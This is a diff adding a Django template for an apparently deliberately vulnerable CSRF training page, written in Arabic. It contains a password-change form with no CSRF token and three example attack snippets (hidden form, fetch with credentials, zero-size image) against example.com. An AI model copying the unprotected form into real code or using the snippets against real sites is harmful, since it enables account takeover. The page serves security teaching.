@@ -1,0 +1,196 @@
+<!-- templates/csrf.html -->
+{% extends './base.html' %}
+{% load static %}
+{% block title %}CSRF الضعيف{% endblock %} 
+{% block hero %}
+
+<style>
+  .bg-image {
+    background-size: cover;
+    background-position: center;
+    background-attachment: fixed;
+    min-height: 100vh;
+    position: relative;
+  }
+  .bg-overlay {
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background-color: rgba(0, 0, 0, 0.8);
+    min-height: 100%;
+  }
+  .content-overlay {
+    position: relative;
+    z-index: 1;
+    color: white;
+    padding: 5vh 0;
+    min-height: 100vh;
+  }
+  .hacking-info {
+    margin-top: 30px;
+  }
+  .viewport {
+    background-color: #282a36;
+    border-radius: 6px;
+    padding: 10px;
+    margin-top: 10px;
+  }
+  .card {
+    background-color: #44475a;
+    border-radius: 6px;
+    overflow: hidden;
+  }
+  .header {
+    background-color: #6272a4;
+    padding: 10px;
+  }
+  .dot {
+    width: 12px;
+    height: 12px;
+    border-radius: 50%;
+    display: inline-block;
+    margin-right: 5px;
+  }
+  .red { background-color: #ff5555; }
+  .yellow { background-color: #f1fa8c; }
+  .green { background-color: #50fa7b; }
+  .content {
+    padding: 10px;
+    color: #f8f8f2;
+  }
+</style>
+
+<div class="bg-image" style="background-image: url('{% static 'cyper_app/img/csrf.jpg' %}');" id="mainContent">
+  <div class="bg-overlay">
+    <div class="container content-overlay py-5">
+      <h1 class="display-4">تغيير كلمة المرور</h1>
+      <p class="lead">
+        <form method="post" class="mb-3">
+          <div class="mb-3">
+            <label for="new_password" class="form-label">كلمة المرور الجديدة:</label>
+            <input type="password" class="form-control" id="new_password" name="new_password" />
+          </div>
+          <button type="submit" class="btn btn-primary btn-lg">تغيير</button>
+        </form>
+      </p>
+
+      <p class="lead">
+        {% if message %}
+        <div class="alert alert-success">{{ message }}</div>
+        {% endif %}
+      </p>
+
+      <hr class="my-4">
+      <p>استكشف أهم الأساليب المستخدمة في هجمات CSRF.</p>
+      <button class="btn btn-primary btn-lg" id="learnMoreBtn">تعلم المزيد</button>
+
+      <div class="hacking-info" id="hackingInfo">
+        <div class="hacking-item">
+          <div class="hacking-text">
+            <h3>نموذج HTML بسيط لهجوم CSRF</h3>
+            <div class="viewport" dir="ltr">
+              <div class="card">
+                <div class="header">
+                  <div class="dot red"></div>
+                  <div class="dot yellow"></div>
+                  <div class="dot green"></div>
+                </div>
+                <div class="content">
+                  <code>
+&lt;form action="http://example.com/change_password" method="POST"&gt;
+  &lt;input type="hidden" name="new_password" value="hacked"&gt;
+  &lt;input type="submit" value="انقر هنا للفوز!"&gt;
+&lt;/form&gt;
+                  </code>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <hr class="my-4">
+
+        <div class="hacking-item">
+          <div class="hacking-text">
+            <h3>استخدام JavaScript لإرسال الطلب تلقائيًا</h3>
+            <div class="viewport" dir="ltr">
+              <div class="card">
+                <div class="header">
+                  <div class="dot red"></div>
+                  <div class="dot yellow"></div>
+                  <div class="dot green"></div>
+                </div>
+                <div class="content">
+                  <code>
+&lt;script&gt;
+  fetch('http://example.com/change_password', {
+    method: 'POST',
+    body: new URLSearchParams('new_password=hacked'),
+    credentials: 'include'
+  });
+&lt;/script&gt;
+                  </code>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <hr class="my-4">
+
+        <div class="hacking-item">
+          <div class="hacking-text">
+            <h3>استخدام صورة لتنفيذ الهجوم</h3>
+            <div class="viewport" dir="ltr">
+              <div class="card">
+                <div class="header">
+                  <div class="dot red"></div>
+                  <div class="dot yellow"></div>
+                  <div class="dot green"></div>
+                </div>
+                <div class="content">
+                  <code>
+&lt;img src="http://example.com/change_password?new_password=hacked" width="0" height="0" /&gt;
+                  </code>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <hr class="my-4">
+
+        <div class="hacking-item">
+          <div class="hacking-text">
+            <h3>الفرق بين CSRF و XSS</h3>
+            <p>هناك فروق مهمة بين هجمات CSRF (Cross-Site Request Forgery) وهجمات XSS (Cross-Site Scripting).  الفروق الرئيسية بينهما:</p>
+            
+            <h4>الهدف والآلية:</h4>
+            <h5>CSRF:</h5>
+            <ul>
+              <li>الهدف: إجبار المستخدم على تنفيذ إجراءات غير مرغوب فيها على موقع موثوق به.</li>
+              <li>الآلية: استغلال ثقة الموقع في متصفح المستخدم وحالة المصادقة الخاصة به.</li>
+            </ul>
+            
+            <h5>XSS:</h5>
+            <ul>
+              <li>الهدف: تنفيذ برمجيات نصية ضارة في متصفح المستخدم.</li>
+              <li>الآلية: حقن وتنفيذ كود JavaScript ضار في صفحة الويب.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+{% endblock %}
+
+{% block scripts %}
+<script>
+  const mainContentHeight = 87;
+</script>
+
+{% endblock scripts %}
